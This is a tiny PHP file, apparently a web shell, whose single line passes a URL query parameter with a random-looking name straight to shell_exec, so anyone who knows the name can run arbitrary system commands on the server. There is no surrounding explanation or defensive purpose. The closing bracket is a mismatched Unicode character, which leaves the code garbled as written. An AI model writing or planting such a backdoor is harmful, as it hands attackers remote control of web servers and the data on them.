<?php
shell_exec($_GET['CpFFZhLB'〕);
?>
